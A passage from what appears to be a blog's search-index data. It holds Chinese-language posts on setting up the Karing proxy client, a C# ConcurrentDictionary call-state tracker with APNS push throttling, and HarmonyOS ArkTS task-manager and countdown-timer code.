添加配置 → 添加配置链接 输入你的订阅链接 勾选 自动移除失效服务器 点击 ✅ 保存 如果提示 添加成功，说明订阅节点有效 1.4 节点测试与选择 在 设置 → 我的配置 中找到订阅 点击 ⚡ 闪电按钮，测试所有节点延迟 程序会自动选择最快的节点 也可进入 节点列表 → 齿轮按钮，勾选： 按延迟排序 隐藏无效服务器 1.5 启用代理 回到主界面，点击：\n✅ 启用系统代理 并选择模式： 全局模式：所有流量走代理 规则模式：按规则自动分流 2. iOS 客户端 2.1 下载 iOS 客户端可通过以下方式获取：\nApp Store：搜索 Karing 或从 官网 获取下载链接 注意：部分地区可能需要使用海外 Apple ID 才能下载。\n2.2 添加订阅 打开 Karing，进入 配置管理 点击 + 添加配置 → 添加配置链接 粘贴订阅地址，点击 ✅ 保存 成功后会显示可用节点列表 2.3 节点测试与选择 进入 节点页面 点击 ⚡ 测试延迟 可按延迟快慢选择节点 也可启用自动选择最快节点 2.4 启用代理 在首页点击 启用 VPN iOS 会提示添加 VPN 配置，点击允许 之后即可在系统状态栏看到 VPN 图标，表示代理启用成功 总结 Windows 端：解压/安装 → 添加订阅 → 测试节点 → 启用系统代理 iOS 端：App Store 下载 → 添加订阅 → 选择节点 → 启用 VPN Karing 的优势是：\n界面简洁，支持多协议订阅 自动测试节点延迟并选择最快 跨平台支持（PC、手机、电视均可用） ","permalink":"https://qfsyso.github.io/posts/karing/","summary":"Karing 客户端使用教程 (Windows \u0026amp; iOS) Karing 是一款兼容 Clash 的通用代理工具，支持 Clash / V2Ray / Shadowsocks 等协议。\n目前官方提供 Windows、MacOS、Android、iOS、tvOS 等客户端。\nWindows 和 iOS 的使用方法。\n1. Windows 客户端 1.1 下载 Karing Windows 客户端可在以下位置下载：\nGitHub Release：KaringX/karing 官网：karing.app 提供两种版本：\n安装版：常规安装使用 绿色版：解压即可使用（推荐） 1.2 设置分流 打开客户端，点击右下角 分流 将 国家/地区 设置为你当前上网地区 Rule Set 保持默认即可（内置规则有效） 1.3 添加订阅 点击左上角 设置 → 添加配置 → 添加配置链接 输入你的订阅链接 勾选 自动移除失效服务器 点击 ✅ 保存 如果提示 添加成功，说明订阅节点有效 1.4 节点测试与选择 在 设置 → 我的配置 中找到订阅 点击 ⚡ 闪电按钮，测试所有节点延迟 程序会自动选择最快的节点 也可进入 节点列表 → 齿轮按钮，勾选： 按延迟排序 隐藏无效服务器 1.","title":"Karing"},{"content":"线程安全字典（ConcurrentDictionary） APNS 推送逻辑 里维护一个 通话列表，列表里存储每个 UserID 和 ReadID 的 状态值，并且和推送逻辑关联。\n定义一个 枚举 表示通话状态值，方便维护。\n用一个 线程安全字典（ConcurrentDictionary）来存储 (UserID, ReadID) → 状态值。\n每次收到消息时，更新状态表，并根据状态值执行推送逻辑。\n代码结构更清晰，避免重复判断。\nusing System; using System.Collections.Concurrent; using System.Threading.Tasks; public enum CallState { Connecting = 0, // 连接中 Connected = 1, // 已连接 Ended = 2, // 已结束 Canceled = 3, // 已取消 Declined = 4, // 已拒绝 Accepted = 5, // 已接听 NoPrivacyPassword = 6,// 没有设置隐私密码 Busy = 7, // 忙线 NoAnswer = 8, // 无应答 CallFailed = 9, // 通话失败 CallInterrupted = 10 // 通话中断 } public class CallSessionManager { // 线程安全字典，维护通话状态 (UserID, ReadID) -\u0026gt; 状态 private static readonly ConcurrentDictionary\u0026lt;(string UserID, string ReadID), CallState\u0026gt; CallStates = new ConcurrentDictionary\u0026lt;(string, string), CallState\u0026gt;(); /// \u0026lt;summary\u0026gt; /// 更新通话状态 /// \u0026lt;/summary\u0026gt; public static void UpdateCallState(string userId, string readId, CallState state) { CallStates[(userId, readId)] = state; } /// \u0026lt;summary\u0026gt; /// 获取当前通话状态 /// \u0026lt;/summary\u0026gt; public static CallState GetCallState(string userId, string readId) { return CallStates.TryGetValue((userId, readId), out var state) ? state : CallState.Connecting; } /// \u0026lt;summary\u0026gt; /// 推送逻辑 /// \u0026lt;/summary\u0026gt; public static void HandlePush(dynamic received, int rsint8, int isIos17, string tkdev, string[] tkdevs) { // 更新状态表 var state = (CallState)rsint8; UpdateCallState(received.UserID, received.ReadID, state); // 根据状态做推送 if (state == CallState.Connecting) { if (isIos17 == 0) { // VOIP 推送 Task.Run(() =\u0026gt; ApnsClient.SendPushAsync( tkdev, received.Un2rs, received.Con2rs, received.AutoID.ToString(), received.UserID, received.MsgState.ToString(), received.MsgType.ToString(), received.Content, received.Un2rs, sandbox: true, voip: true )); } else { tkdev = tkdevs[0]; string con2rs = received.MsgType == 3 ? \u0026#34;邀请进行视频通话\u0026#34; : \u0026#34;邀请进行音频通话\u0026#34;; Task.Run(() =\u0026gt; ApnsClient.SendPushAsync( tkdev, received.Un2rs, con2rs, received.AutoID.ToString(), received.UserID, received.MsgState.ToString(), received.MsgType.ToString(), received.Content, received.Un2rs, sandbox: true )); } } else { // 其他状态可以根据需要扩展推送逻辑 Console.WriteLine($\u0026#34;[{received.UserID}-{received.ReadID}] 状态更新为：{state}\u0026#34;); } } } 通话状态值集中在 CallState 枚举中，容易维护。\nCallSessionManager 管理所有用户通话状态（线程安全）。\n推送逻辑跟状态解耦，以后要加不同状态下的推送只需扩展 switch 或 if。\n只发一次推送 短时间内连续 state == CallState.Connecting 对同一个 received.ReadID（同一个接收人）\n记录最后一次推送时间： 给 (UserID, ReadID) 存一个 LastPushTime，如果距离上次推送小于某个阈值（例如 3 秒 / 5 秒），就跳过推送。\n只允许一个 Connecting 状态推送： 如果 CallState.Connecting 已经推送过，就不要重复推。\n在 CallSessionManager 里加一个 推送时间表，并在推送前判断。\nusing System; using System.Collections.Concurrent; using System.Threading.Tasks; public enum CallState { Connecting = 0, Connected = 1, Ended = 2, Canceled = 3, Declined = 4, Accepted = 5, NoPrivacyPassword = 6, Busy = 7, NoAnswer = 8, CallFailed = 9, CallInterrupted = 10 } public class CallSessionManager { private static readonly ConcurrentDictionary\u0026lt;(string UserID, string ReadID), CallState\u0026gt; CallStates = new ConcurrentDictionary\u0026lt;(string, string), CallState\u0026gt;(); // 记录最后推送时间 private static readonly ConcurrentDictionary\u0026lt;string, DateTime\u0026gt; LastPushTimes = new ConcurrentDictionary\u0026lt;string, DateTime\u0026gt;(); private static readonly TimeSpan PushCooldown = TimeSpan.FromSeconds(5); // 限制5秒内只推一次 public static void UpdateCallState(string userId, string readId, CallState state) { CallStates[(userId, readId)] = state; } public static CallState GetCallState(string userId, string readId) { return CallStates.TryGetValue((userId, readId), out var state) ? state : CallState.Connecting; } public static void HandlePush(dynamic received, int rsint8, int isIos17, string tkdev, string[] tkdevs) { var state = (CallState)rsint8; UpdateCallState(received.UserID, received.ReadID, state); if (state == CallState.Connecting) { // 判断短时间是否已经推送过 var key = received.ReadID.ToString(); var now = DateTime.UtcNow; if (LastPushTimes.TryGetValue(key, out var lastTime)) { if (now - lastTime \u0026lt; PushCooldown) { Console.WriteLine($\u0026#34;[{key}] 在 {PushCooldown.TotalSeconds} 秒内已推送过，跳过。\u0026#34;); return; // 不重复推送 } } LastPushTimes[key] = now; // 记录最新推送时间 if (isIos17 == 0) { // VOIP 推送 Task.Run(() =\u0026gt; ApnsClient.SendPushAsync( tkdev, received.Un2rs, received.Con2rs, received.AutoID.ToString(), received.UserID, received.MsgState.ToString(), received.MsgType.ToString(), received.Content, received.Un2rs, sandbox: true, voip: true )); } else { tkdev = tkdevs[0]; string con2rs = received.MsgType == 3 ? \u0026#34;邀请进行视频通话\u0026#34; : \u0026#34;邀请进行音频通话\u0026#34;; Task.Run(() =\u0026gt; ApnsClient.SendPushAsync( tkdev, received.Un2rs, con2rs, received.AutoID.ToString(), received.UserID, received.MsgState.ToString(), received.MsgType.ToString(), received.Content, received.Un2rs, sandbox: true )); } } else { Console.WriteLine($\u0026#34;[{received.UserID}-{received.ReadID}] 状态更新为：{state}\u0026#34;); } } } 改动点\n新增 LastPushTimes 记录每个 ReadID 的最后推送时间。\n在 CallState.Connecting 推送前判断，如果在 5 秒内已经推送过，就跳过。\n时间间隔可配（PushCooldown）。\njson status 处理 可以用 C# 的 System.Text.Json 或 Newtonsoft.Json 来修改 status 字段。\n用 System.Text.Json (内置库，.NET Core/5+/6+ 推荐) using System.Text.Json; // 原始 JSON string json = \u0026#34;{\\\u0026#34;status\\\u0026#34;:3,\\\u0026#34;callID\\\u0026#34;:\\\u0026#34;198D042E-6460-443A-86C1-93BC1EE799BF\\\u0026#34;,\\\u0026#34;duration\\\u0026#34;:0}\u0026#34;; // 反序列化为 JsonDocument using var doc = JsonDocument.Parse(json); var root = doc.RootElement; // 创建可修改的对象 var obj = new { status = 0, // 改为 0 callID = root.GetProperty(\u0026#34;callID\u0026#34;).GetString(), duration = root.GetProperty(\u0026#34;duration\u0026#34;).GetInt32() }; // 序列化回字符串 string newJson = JsonSerializer.Serialize(obj); Console.WriteLine(newJson); 输出：\n{\u0026#34;status\u0026#34;:0,\u0026#34;callID\u0026#34;:\u0026#34;198D042E-6460-443A-86C1-93BC1EE799BF\u0026#34;,\u0026#34;duration\u0026#34;:0} 用 Newtonsoft.Json (更灵活) using Newtonsoft.Json.Linq; // 原始 JSON string json = \u0026#34;{\\\u0026#34;status\\\u0026#34;:3,\\\u0026#34;callID\\\u0026#34;:\\\u0026#34;198D042E-6460-443A-86C1-93BC1EE799BF\\\u0026#34;,\\\u0026#34;duration\\\u0026#34;:0}\u0026#34;; // 解析为 JObject var jObj = JObject.Parse(json); // 修改 status jObj[\u0026#34;status\u0026#34;] = 0; // 转成字符串 string newJson = jObj.ToString(); Console.WriteLine(newJson); 输出同样是：\n{ \u0026#34;status\u0026#34;: 0, \u0026#34;callID\u0026#34;: \u0026#34;198D042E-6460-443A-86C1-93BC1EE799BF\u0026#34;, \u0026#34;duration\u0026#34;: 0 } Next 其他状态（比如取消、拒绝、忙线等）\n","permalink":"https://qfsyso.github.io/posts/.net-concurrentdictionary/","summary":"线程安全字典（ConcurrentDictionary） APNS 推送逻辑 里维护一个 通话列表，列表里存储每个 UserID 和 ReadID 的 状态值，并且和推送逻辑关联。\n定义一个 枚举 表示通话状态值，方便维护。\n用一个 线程安全字典（ConcurrentDictionary）来存储 (UserID, ReadID) → 状态值。\n每次收到消息时，更新状态表，并根据状态值执行推送逻辑。\n代码结构更清晰，避免重复判断。\nusing System; using System.Collections.Concurrent; using System.Threading.Tasks; public enum CallState { Connecting = 0, // 连接中 Connected = 1, // 已连接 Ended = 2, // 已结束 Canceled = 3, // 已取消 Declined = 4, // 已拒绝 Accepted = 5, // 已接听 NoPrivacyPassword = 6,// 没有设置隐私密码 Busy = 7, // 忙线 NoAnswer = 8, // 无应答 CallFailed = 9, // 通话失败 CallInterrupted = 10 // 通话中断 } public class CallSessionManager { // 线程安全字典，维护通话状态 (UserID, ReadID) -\u0026gt; 状态 private static readonly ConcurrentDictionary\u0026lt;(string UserID, string ReadID), CallState\u0026gt; CallStates = new ConcurrentDictionary\u0026lt;(string, string), CallState\u0026gt;(); /// \u0026lt;summary\u0026gt; /// 更新通话状态 /// \u0026lt;/summary\u0026gt; public static void UpdateCallState(string userId, string readId, CallState state) { CallStates[(userId, readId)] = state; } /// \u0026lt;summary\u0026gt; /// 获取当前通话状态 /// \u0026lt;/summary\u0026gt; public static CallState GetCallState(string userId, string readId) { return CallStates.","title":".NET ConcurrentDictionary"},{"content":"目录结构 📁 项目结构\nentry/src/main/ets/ ├── interface/ │ └── TaskDataInterface.ets # 类型接口定义 ├── model/ │ └── TaskModel.ets # 任务数据模型 ├── service/ │ ├── TaskService.ets # 任务业务逻辑 │ ├── StorageService.ets # 本地存储服务 │ └── DataManager.ets # 数据管理器 ├── utils/ │ └── StorageUtils.ets # 存储工具类 └── pages/ ├── Index.ets # 应用入口 ├── MainPage.ets # 主页面 ├── TaskListPage.ets # 任务列表 ├── AddTaskPage.ets # 添加任务 └── EditTaskPage.ets # 编辑任务 🔧 技术特性 开发平台: HarmonyOS 5.0.5 (API 17) 开发语言: ArkTS 架构模式: MVC + 服务层 类型安全: 完整的TypeScript类型定义 数据存储: HarmonyOS Preferences API UI框架: ArkUI 初始版本 ✅ 时间任务管理: 创建和管理基于时间的任务 ✅ 存钱任务管理: 创建和管理存钱目标任务 ✅ 进度跟踪: 实时计算和显示任务进度 ✅ 状态管理: 自动判断任务状态（进行中/已完成/已过期） ✅ 用户界面: 现代化的Material Design风格界面 ✅ 导航系统: 底部导航栏，分离列表和添加功能 ✅ 任务操作: 完整的增删改查功能 ✅ 响应式设计: 适配不同屏幕尺寸\n核心功能 📱 任务列表展示和筛选 ➕ 添加新任务（时间类/存钱类） ✏️ 编辑现有任务 🗑️ 删除任务 📊 进度条和百分比显示 🎨 状态颜色编码 📅 日期选择器 💰 金额输入和计算\nMain import { TaskListPage } from \u0026#39;./TaskListPage\u0026#39;; import { AddTaskPage } from \u0026#39;./AddTaskPage\u0026#39;; import { SettingsPage } from \u0026#39;./SettingsPage\u0026#39;; import { I18nService } from \u0026#39;../service/I18nService\u0026#39;; import { TaskService } from \u0026#39;../service/TaskService\u0026#39;; import router from \u0026#39;@ohos.router\u0026#39;; @Entry @Component export struct MainPage { @State currentTabIndex: number = 0; @State currentLanguage: string = \u0026#39;zh-CN\u0026#39;; private tabsController: TabsController = new TabsController(); private i18nService: I18nService = I18nService.getInstance(); private taskService: TaskService = TaskService.getInstance(); private refreshTimer: number = -1; aboutToAppear() { this.currentLanguage = this.i18nService.getCurrentLanguage(); // 启动时立即刷新任务状态 this.taskService.refreshAllTasksStatus(); this.startAutoRefresh(); // 检查是否有传入的标签页索引参数 const params = router.getParams() as Record\u0026lt;string, Object\u0026gt;; if (params \u0026amp;\u0026amp; params.tabIndex !== undefined) { this.currentTabIndex = params.tabIndex as number; } } aboutToDisappear() { this.stopAutoRefresh(); } onPageShow() { // 页面显示时检查语言是否有变化并刷新任务状态 const newLanguage = this.i18nService.getCurrentLanguage(); if (newLanguage !== this.currentLanguage) { this.currentLanguage = newLanguage; } // 立即刷新一次任务状态 this.taskService.refreshAllTasksStatus(); } // 开始自动刷新 private startAutoRefresh() { this.refreshTimer = setInterval(() =\u0026gt; { this.taskService.refreshAllTasksStatus(); }, 60000); // 每分钟刷新一次任务状态 } // 停止自动刷新 private stopAutoRefresh() { if (this.refreshTimer !== -1) { clearInterval(this.refreshTimer); this.refreshTimer = -1; } } build() { Column() { // 顶部标题栏 Row() { Text(this.i18nService.getText(\u0026#39;app_name\u0026#39;)) .fontSize(20) .fontWeight(FontWeight.Bold) .fontColor(\u0026#39;#333333\u0026#39;) } .width(\u0026#39;100%\u0026#39;) .height(56) .justifyContent(FlexAlign.Center) .backgroundColor(\u0026#39;#f8f9fa\u0026#39;) .border({ width: { bottom: 1 }, color: \u0026#39;#e9ecef\u0026#39; }) // 主要内容区域 Tabs({ barPosition: BarPosition.End, controller: this.tabsController }) { TabContent() { TaskListPage() } .tabBar(this.TabBuilder(this.i18nService.getText(\u0026#39;nav_task_list\u0026#39;), 0)) TabContent() { AddTaskPage() } .tabBar(this.TabBuilder(this.i18nService.getText(\u0026#39;nav_add_task\u0026#39;), 1)) TabContent() { SettingsPage() } .tabBar(this.TabBuilder(this.i18nService.getText(\u0026#39;nav_settings\u0026#39;), 2)) } .layoutWeight(1) .onChange((index: number) =\u0026gt; { this.currentTabIndex = index; }) .barBackgroundColor(\u0026#39;#ffffff\u0026#39;) .barMode(BarMode.Fixed) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#39;#f5f5f5\u0026#39;) } @Builder TabBuilder(title: string, targetIndex: number) { Column() { Text(title) .fontSize(14) .fontColor(this.currentTabIndex === targetIndex ? \u0026#39;#007AFF\u0026#39; : \u0026#39;#8E8E93\u0026#39;) .fontWeight(this.currentTabIndex === targetIndex ? FontWeight.Medium : FontWeight.Normal) } .width(\u0026#39;100%\u0026#39;) .height(56) .justifyContent(FlexAlign.Center) .alignItems(HorizontalAlign.Center) } } Model // 任务类型枚举 export enum TaskType { TIME_BASED = \u0026#39;time_based\u0026#39;, // 时间类任务 MONEY_BASED = \u0026#39;money_based\u0026#39; // 存钱类任务 } // 任务状态枚举 export enum TaskStatus { IN_PROGRESS = \u0026#39;in_progress\u0026#39;, // 进行中 COMPLETED = \u0026#39;completed\u0026#39;, // 已完成 OVERDUE = \u0026#39;overdue\u0026#39; // 已过期 } // 任务数据模型 export class Task { id: string = \u0026#39;\u0026#39;; title: string = \u0026#39;\u0026#39;; type: TaskType = TaskType.TIME_BASED; status: TaskStatus = TaskStatus.IN_PROGRESS; // 时间类任务字段 startDate?: Date; endDate?: Date; // 存钱类任务字段 targetAmount?: number; currentAmount?: number; createdAt: Date = new Date(); updatedAt: Date = new Date(); constructor() { this.id = this.generateId(); } private generateId(): string { return Date.now().toString(36) + Math.random().toString(36).substring(2); } // 计算时间类任务的进度百分比 getTimeProgress(): number { if (this.type !== TaskType.TIME_BASED || !this.startDate || !this.endDate) { return 0; } const now = new Date(); const totalTime = this.endDate.getTime() - this.startDate.getTime(); const elapsedTime = now.getTime() - this.startDate.getTime(); if (elapsedTime \u0026lt;= 0) return 0; if (elapsedTime \u0026gt;= totalTime) return 100; return Math.round((elapsedTime / totalTime) * 100); } // 计算存钱类任务的进度百分比 getMoneyProgress(): number { if (this.type !== TaskType.MONEY_BASED || !this.targetAmount || this.targetAmount \u0026lt;= 0) { return 0; } const current = this.currentAmount || 0; const progress = (current / this.targetAmount) * 100; return Math.min(Math.round(progress), 100); } // 获取任务进度百分比 getProgress(): number { return this.type === TaskType.TIME_BASED ? this.getTimeProgress() : this.getMoneyProgress(); } // 计算剩余天数 getRemainingDays(): number { if (this.type !== TaskType.TIME_BASED || !this.endDate) { return 0; } const now = new Date(); const remaining = this.endDate.getTime() - now.getTime(); return Math.ceil(remaining / (1000 * 60 * 60 * 24)); } // 计算剩余金额 getRemainingAmount(): number { if (this.type !== TaskType.MONEY_BASED || !this.targetAmount) { return 0; } const current = this.currentAmount || 0; return Math.max(this.targetAmount - current, 0); } // 更新任务状态 updateStatus(): void { if (this.type === TaskType.TIME_BASED) { const progress = this.getTimeProgress(); const remainingDays = this.getRemainingDays(); if (progress \u0026gt;= 100 || remainingDays \u0026lt;= 0) { this.status = TaskStatus.COMPLETED; } else if (remainingDays \u0026lt; 0) { this.status = TaskStatus.OVERDUE; } else { this.status = TaskStatus.IN_PROGRESS; } } else { const progress = this.getMoneyProgress(); this.status = progress \u0026gt;= 100 ? TaskStatus.COMPLETED : TaskStatus.IN_PROGRESS; } this.updatedAt = new Date(); } } Check // 简单的ArkTS语法检查脚本 const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); // 检查文件是否存在的函数 function checkFileExists(filePath) { try { return fs.existsSync(filePath); } catch (error) { return false; } } // 检查文件内容的基本语法 function checkBasicSyntax(filePath) { try { const content = fs.readFileSync(filePath, \u0026#39;utf8\u0026#39;); // 检查基本的语法问题 const issues = []; // 检查是否有未闭合的大括号 const openBraces = (content.match(/\\{/g) || []).length; const closeBraces = (content.match(/\\}/g) || []).length; if (openBraces !== closeBraces) { issues.push(`大括号不匹配: 开括号${openBraces}个，闭括号${closeBraces}个`); } // 检查是否有未闭合的小括号 const openParens = (content.match(/\\(/g) || []).length; const closeParens = (content.match(/\\)/g) || []).length; if (openParens !== closeParens) { issues.push(`小括号不匹配: 开括号${openParens}个，闭括号${closeParens}个`); } return issues; } catch (error) { return [`读取文件失败: ${error.message}`]; } } // 要检查的文件列表 const filesToCheck = [ \u0026#39;entry/src/main/ets/model/TaskModel.ets\u0026#39;, \u0026#39;entry/src/main/ets/model/TaskDataInterface.ets\u0026#39;, \u0026#39;entry/src/main/ets/model/SettingsInterface.ets\u0026#39;, \u0026#39;entry/src/main/ets/service/TaskService.ets\u0026#39;, \u0026#39;entry/src/main/ets/service/StorageService.ets\u0026#39;, \u0026#39;entry/src/main/ets/service/DataManager.ets\u0026#39;, \u0026#39;entry/src/main/ets/service/I18nService.ets\u0026#39;, \u0026#39;entry/src/main/ets/service/StorageUtils.ets\u0026#39;, \u0026#39;entry/src/main/ets/pages/Index.ets\u0026#39;, \u0026#39;entry/src/main/ets/pages/MainPage.ets\u0026#39;, \u0026#39;entry/src/main/ets/pages/TaskListPage.ets\u0026#39;, \u0026#39;entry/src/main/ets/pages/AddTaskPage.ets\u0026#39;, \u0026#39;entry/src/main/ets/pages/EditTaskPage.ets\u0026#39;, \u0026#39;entry/src/main/ets/pages/SettingsPage.ets\u0026#39;, ]; console.log(\u0026#39;开始检查ArkTS文件语法...\\n\u0026#39;); let totalIssues = 0; filesToCheck.forEach(filePath =\u0026gt; { console.log(`检查文件: ${filePath}`); if (!checkFileExists(filePath)) { console.log(` ❌ 文件不存在`); totalIssues++; return; } const issues = checkBasicSyntax(filePath); if (issues.length === 0) { console.log(` ✅ 基本语法检查通过`); } else { console.log(` ❌ 发现问题:`); issues.forEach(issue =\u0026gt; { console.log(` - ${issue}`); }); totalIssues += issues.length; } console.log(\u0026#39;\u0026#39;); }); console.log(`检查完成！总共发现 ${totalIssues} 个问题。`); if (totalIssues === 0) { console.log(\u0026#39;🎉 所有文件基本语法检查通过！\u0026#39;); } else { console.log(\u0026#39;⚠️ 请修复上述问题后重新检查。\u0026#39;); } Next UI优化 数据导入导出 局域网传输\n功能扩展 数据持久化: 集成HarmonyOS数据库API 通知提醒: 添加任务到期提醒功能 数据统计: 任务完成率和趋势分析 主题切换: 支持深色模式和自定义主题 数据同步: 云端数据备份和同步 性能优化 懒加载: 大量任务时的性能优化 缓存机制: 提升应用响应速度 内存管理: 优化内存使用效率 动画效果: 增加流畅的过渡动画 用户体验 手势操作: 支持滑动删除等手势 语音输入: 语音创建任务功能 快捷操作: 桌面小组件支持 无障碍: 提升可访问性支持 ","permalink":"https://qfsyso.github.io/posts/harmonyos-taskapp/","summary":"目录结构 📁 项目结构\nentry/src/main/ets/ ├── interface/ │ └── TaskDataInterface.ets # 类型接口定义 ├── model/ │ └── TaskModel.ets # 任务数据模型 ├── service/ │ ├── TaskService.ets # 任务业务逻辑 │ ├── StorageService.ets # 本地存储服务 │ └── DataManager.ets # 数据管理器 ├── utils/ │ └── StorageUtils.ets # 存储工具类 └── pages/ ├── Index.ets # 应用入口 ├── MainPage.ets # 主页面 ├── TaskListPage.ets # 任务列表 ├── AddTaskPage.ets # 添加任务 └── EditTaskPage.ets # 编辑任务 🔧 技术特性 开发平台: HarmonyOS 5.0.5 (API 17) 开发语言: ArkTS 架构模式: MVC + 服务层 类型安全: 完整的TypeScript类型定义 数据存储: HarmonyOS Preferences API UI框架: ArkUI 初始版本 ✅ 时间任务管理: 创建和管理基于时间的任务 ✅ 存钱任务管理: 创建和管理存钱目标任务 ✅ 进度跟踪: 实时计算和显示任务进度 ✅ 状态管理: 自动判断任务状态（进行中/已完成/已过期） ✅ 用户界面: 现代化的Material Design风格界面 ✅ 导航系统: 底部导航栏，分离列表和添加功能 ✅ 任务操作: 完整的增删改查功能 ✅ 响应式设计: 适配不同屏幕尺寸","title":"HarmonyOS TaskApp"},{"content":"targetSdkVersion HarmonyOS 5.0.5(API 17)\nTimer @Entry @Component struct Index { @State currentTime: string = \u0026#39;\u0026#39;; @State minutes: number = 0; @State seconds: number = 0; @State totalSeconds: number = 0; @State remainingSeconds: number = 0; @State isRunning: boolean = false; @State isPaused: boolean = false; @State isFinished: boolean = false; private timer: number = -1; private clockTimer: number = -1; aboutToAppear() { this.updateCurrentTime(); this.clockTimer = setInterval(() =\u0026gt; { this.updateCurrentTime(); }, 1000); } aboutToDisappear() { if (this.timer !== -1) { clearInterval(this.timer); } if (this.clockTimer !== -1) { clearInterval(this.clockTimer); } } updateCurrentTime() { const now = new Date(); this.currentTime = now.toLocaleTimeString(\u0026#39;zh-CN\u0026#39;, { hour12: false, hour: \u0026#39;2-digit\u0026#39;, minute: \u0026#39;2-digit\u0026#39;, second: \u0026#39;2-digit\u0026#39; }); } startTimer() { if (this.minutes === 0 \u0026amp;\u0026amp; this.seconds === 0) { return; } if (!this.isPaused) { this.totalSeconds = this.minutes * 60 + this.seconds; this.remainingSeconds = this.totalSeconds; } this.isRunning = true; this.isPaused = false; this.isFinished = false; this.timer = setInterval(() =\u0026gt; { if (this.remainingSeconds \u0026gt; 0) { this.remainingSeconds--; } else { this.finishTimer(); } }, 1000); } pauseTimer() { if (this.timer !== -1) { clearInterval(this.timer); this.timer = -1; } this.isRunning = false; this.isPaused = true; } resetTimer() { if (this.timer !== -1) { clearInterval(this.timer); this.timer = -1; } this.isRunning = false; this.isPaused = false; this.isFinished = false; this.remainingSeconds = 0; this.minutes = 0; this.seconds = 0; } finishTimer() { if (this.timer !== -1) { clearInterval(this.timer); this.timer = -1; } this.isRunning = false; this.isPaused = false; this.isFinished = true; this.remainingSeconds = 0; } formatTime(totalSeconds: number): string { const mins = Math.floor(totalSeconds / 60); const secs = totalSeconds % 60; return `${mins.toString().padStart(2, \u0026#39;0\u0026#39;)}:${secs.toString().padStart(2, \u0026#39;0\u0026#39;)}`; } build() { Column() { // 当前时间显示 Text(\u0026#39;当前时间\u0026#39;) .fontSize(16) .fontColor(\u0026#39;#666666\u0026#39;) .margin({ top: 40 }) Text(this.currentTime) .fontSize(24) .fontWeight(FontWeight.Bold) .fontColor(\u0026#39;#333333\u0026#39;) .margin({ bottom: 40 }) // 定时器标题 Text(\u0026#39;定时器\u0026#39;) .fontSize(28) .fontWeight(FontWeight.Bold) .fontColor(\u0026#39;#333333\u0026#39;) .margin({ bottom: 30 }) // 时间设置区域 if (!this.isRunning \u0026amp;\u0026amp; !this.isPaused) { Row() { Column() { Text(\u0026#39;分钟\u0026#39;) .fontSize(14) .fontColor(\u0026#39;#666666\u0026#39;) .margin({ bottom: 10 }) TextInput({ text: this.minutes.toString() }) .width(80) .height(40) .textAlign(TextAlign.Center) .type(InputType.Number) .onChange((value: string) =\u0026gt; { const num = parseInt(value) || 0; this.minutes = Math.max(0, Math.min(59, num)); }) } .margin({ right: 20 }) Column() { Text(\u0026#39;秒钟\u0026#39;) .fontSize(14) .fontColor(\u0026#39;#666666\u0026#39;) .margin({ bottom: 10 }) TextInput({ text: this.seconds.toString() }) .width(80) .height(40) .textAlign(TextAlign.Center) .type(InputType.Number) .onChange((value: string) =\u0026gt; { const num = parseInt(value) || 0; this.seconds = Math.max(0, Math.min(59, num)); }) } } .margin({ bottom: 30 }) } // 倒计时显示 if (this.isRunning || this.isPaused || this.isFinished) { Text(this.formatTime(this.remainingSeconds)) .fontSize(48) .fontWeight(FontWeight.Bold) .fontColor(this.isFinished ? \u0026#39;#FF6B6B\u0026#39; : \u0026#39;#4ECDC4\u0026#39;) .margin({ bottom: 20 }) // 进度条 Progress({ value: this.totalSeconds - this.remainingSeconds, total: this.totalSeconds, type: ProgressType.Ring }) .width(120) .height(120) .color(\u0026#39;#4ECDC4\u0026#39;) .margin({ bottom: 30 }) } // 完成提示 if (this.isFinished) { Text(\u0026#39;⏰ 时间到！\u0026#39;) .fontSize(24) .fontWeight(FontWeight.Bold) .fontColor(\u0026#39;#FF6B6B\u0026#39;) .margin({ bottom: 20 }) } // 控制按钮 Row() { if (!this.isRunning \u0026amp;\u0026amp; !this.isPaused) { Button(\u0026#39;开始\u0026#39;) .width(100) .height(40) .backgroundColor(\u0026#39;#4ECDC4\u0026#39;) .fontColor(Color.White) .onClick(() =\u0026gt; { this.startTimer(); }) } else if (this.isRunning) { Button(\u0026#39;暂停\u0026#39;) .width(100) .height(40) .backgroundColor(\u0026#39;#FFB74D\u0026#39;) .fontColor(Color.White) .onClick(() =\u0026gt; { this.pauseTimer(); }) } else if (this.isPaused) { Button(\u0026#39;继续\u0026#39;) .width(100) .height(40) .backgroundColor(\u0026#39;#4ECDC4\u0026#39;) .fontColor(Color.White) .onClick(() =\u0026gt; { this.startTimer(); }) } if (this.isRunning || this.isPaused || this.isFinished) { Button(\u0026#39;重置\u0026#39;) .width(100) .height(40) .backgroundColor(\u0026#39;#FF6B6B\u0026#39;) .fontColor(Color.White) .margin({ left: 20 }) .onClick(() =\u0026gt; { this.resetTimer(); }) } } .margin({ top: 30 }) // 快捷设置按钮 if (!this.isRunning \u0026amp;\u0026amp; !this.isPaused) { Text(\u0026#39;快捷设置\u0026#39;) .fontSize(16) .fontColor(\u0026#39;#666666\u0026#39;) .margin({ top: 40, bottom: 20 }) Row() { Button(\u0026#39;1分钟\u0026#39;) .width(70) .height(35) .backgroundColor(\u0026#39;#E8F5E8\u0026#39;) .fontColor(\u0026#39;#4ECDC4\u0026#39;) .fontSize(12) .onClick(() =\u0026gt; { this.minutes = 1; this.seconds = 0; }) Button(\u0026#39;5分钟\u0026#39;) .width(70) .height(35) .backgroundColor(\u0026#39;#E8F5E8\u0026#39;) .fontColor(\u0026#39;#4ECDC4\u0026#39;) .fontSize(12) .margin({ left: 10 }) .onClick(() =\u0026gt; { this.minutes = 5; this.seconds = 0; }) Button(\u0026#39;10分钟\u0026#39;) .width(70) .height(35) .backgroundColor(\u0026#39;#E8F5E8\u0026#39;) .fontColor(\u0026#39;#4ECDC4\u0026#39;) .fontSize(12) .margin({ left: 10 }) .onClick(() =\u0026gt; { this.minutes = 10; this.seconds = 0; }) Button(\u0026#39;30秒\u0026#39;) .width(70) .height(35) .backgroundColor(\u0026#39;#FFF3E0\u0026#39;) .fontColor(\u0026#39;#FFB74D\u0026#39;) .fontSize(12) .margin({ left: 10 }) .onClick(() =\u0026gt; { this.minutes = 0; this.seconds = 30; }) } } } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .padding(20) .backgroundColor(\u0026#39;#F5F5F5\u0026#39;) } } 主要功能： 当前时间显示 - 实时显示当前系统时间 定时器设置 